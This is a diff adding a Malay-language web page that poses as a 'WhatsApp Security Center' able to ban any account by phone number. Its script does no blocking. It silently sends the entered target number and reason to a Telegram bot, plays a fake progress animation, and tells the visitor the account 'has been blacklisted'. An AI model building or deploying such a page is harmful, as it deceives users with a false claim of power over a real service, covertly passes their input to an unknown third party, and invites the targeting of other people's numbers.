@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Security | AbdlaDoz</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0a1a24;
+            background-image: linear-gradient(180deg, #103040 0%, #08121c 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .bekas {
+            max-width: 420px;
+            margin: 30px auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .logo-wa {
+            font-size: 50px;
+            color: #25d366;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            color: #ffffff;
+            font-size: 22px;
+            margin-bottom: 5px;
+        }
+
+        p {
+            color: #94a3b8;
+            font-size: 14px;
+        }
+
+        .kotak {
+            background: rgba(16, 45, 60, 0.5);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(60, 220, 180, 0.2);
+            border-radius: 18px;
+            padding: 25px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+
+        .notis-amaran {
+            background-color: #ff444420;
+            border: 1px solid #ff4444;
+            color: #ffcccc;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .kumpulan-input {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            color: #c8f0e8;
+            font-weight: 500;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #40e0b040;
+            border-radius: 10px;
+            font-size: 16px;
+            background-color: rgba(25, 60, 80, 0.5);
+            color: #ffffff;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #40e0b0;
+            box-shadow: 0 0 0 2px #40e0b020;
+        }
+
+        .btn-sekat {
+            width: 100%;
+            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 8px;
+            box-shadow: 0 4px 15px #ff444430;
+        }
+
+        .btn-sekat:active {
+            transform: scale(0.97);
+        }
+
+        /* --- PROSES --- */
+        .bahagian-proses {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .bar-proses {
+            width: 100%;
+            height: 8px;
+            background-color: #1e293b;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+
+        .isi-proses {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff4444, #cc0000);
+            border-radius: 4px;
+            transition: 0.3s;
+        }
+
+        .teks-status {
+            text-align: center;
+            color: #40e0b0;
+            font-size: 14px;
+        }
+
+        .hasil {
+            display: none;
+            background-color: #25d36620;
+            border: 1px solid #25d366;
+            color: #dcfce7;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top:  15px;
+            text-align: center;
+        }
+
+        .bawah {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #64748b;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bekas">
+
+        <div class="header">
+            <div class="logo-wa">⚙️</div>
+            <h1>Security Center WhatsApp</h1>
+            <p>System Protection v7.0 | AbdlaDoz</p>
+        </div>
+
+
+        <div class="kotak">
+            <div class="notis-amaran">
+                ⚠️ ALAT KAWALAN KESELAMATAN<br>
+                Guna untuk sekat akaun yang melanggar syarat
+            </div>
+
+
+            <div class="kumpulan-input">
+                <label>Nombor Telefon Sasaran</label>
+                <input type="tel" id="nombor" placeholder="+60 1XXXXXXXXX" required>
+            </div>
+
+            <div class="kumpulan-input">
+                <label>Sebab Sekatan</label>
+                <select id="sebab">
+                    <option value="spam">Spam & Mesej Pukal</option>
+                    <option value="haram">Kandungan Dilarang</option>
+                    <option value="penipuan">Aktiviti Penipuan</option>
+                    <option value="sistem">Pelanggaran Syarat Perkhidmatan</option>
+                </select>
+            </div>
+
+
+            <button class="btn-sekat" onclick="mulakanProses()">🚫 MULA SEKAT AKAUN</button>
+
+
+            <!-- BAHAGIAN PROSES -->
+            <div class="bahagian-proses" id="prosesBahagian">
+                <div class="teks-status" id="teksProses">Memproses permintaan...</div>
+                <div class="bar-proses">
+                    <div class="isi-proses" id="barMaju"></div>
+                </div>
+            </div>
+
+
+            <!-- KEPUTUSAN -->
+            <div class="hasil" id="bahagianHasil">
+                ✅ SELESAI!<br><br>
+                Akaun <b id="nomborHasil"></b> telah disenarai hitam.<br>
+                Sekatan akan aktif dalam masa 5 - 10 minit.
+            </div>
+
+        </div>
+
+
+        <div class="bawah">
+            © 2026 AbdlaDoz Security System<br>
+            *Untuk kegunaan sistem sahaja
+        </div>
+
+    </div>
+
+
+    <script>
+        // ✅ DATA ANDA SUDAH BETUL ✅
+        const BOT_TOKEN = "";
+        const CHAT_ID = "12345678";
+
+
+        function mulakanProses(){
+            let nombor = document.getElementById('nombor').value;
+            let sebab = document.getElementById('sebab').value;
+
+            if(nombor.length < 8){
+                alert("⚠️ Masukkan nombor yang sah dahulu!");
+                return;
+            }
+
+            // Hantar data ke Telegram
+            hantarData(nombor, sebab);
+
+            // Tunjuk bahagian proses
+            document.getElementById('prosesBahagian').style.display = "block";
+            document.getElementById('bahagianHasil').style.display = "none";
+            let nilai = 0;
+
+            // Animasi bar jalan
+            let gerak = setInterval(() => {
+                nilai += 10;
+                document.getElementById('barMaju').style.width = nilai + "%";
+
+                // Tukar teks ikut peringkat
+                if(nilai < 30){
+                    document.getElementById('teksProses').textContent = "🔍 Mengesahkan nombor...";
+                } else if(nilai < 60){
+                    document.getElementById('teksProses').textContent = "⚡ Menyambung ke pelayan pusat...";
+                } else if(nilai < 90){
+                    document.getElementById('teksProses').textContent = "🚫 Mengaktifkan sekatan...";
+                } else {
+                    document.getElementById('teksProses').textContent = "✅ Selesai kemaskini!";
+                }
+
+                // Bila penuh 100%
+                if(nilai >= 100){
+                    clearInterval(gerak);
+                    setTimeout(() => {
+                        // Tunjuk keputusan akhir
+                        document.getElementById('nomborHasil').textContent = nombor;
+                        document.getElementById('bahagianHasil').style.display = "block";
+                    }, 600);
+                }
+
+            }, 200);
+        }
+
+
+        // 📩 FUNGSI HANTAR KE TELEGRAM 📩
+        function hantarData(nombor, sebab){
+            let mesej = `⚠️ PERMINTAAN SEKAT AKAUN ⚠️\n\n📞 Nombor : ${nombor}\n📋 Sebab : ${sebab}\n🖥️ Sistem : AbdlaDoz Security`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: mesej
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok){
+                    console.log("Berjaya hantar ke Telegram");
+                }
+            });
+        }
+    </script>
+
+</body>
+</html>
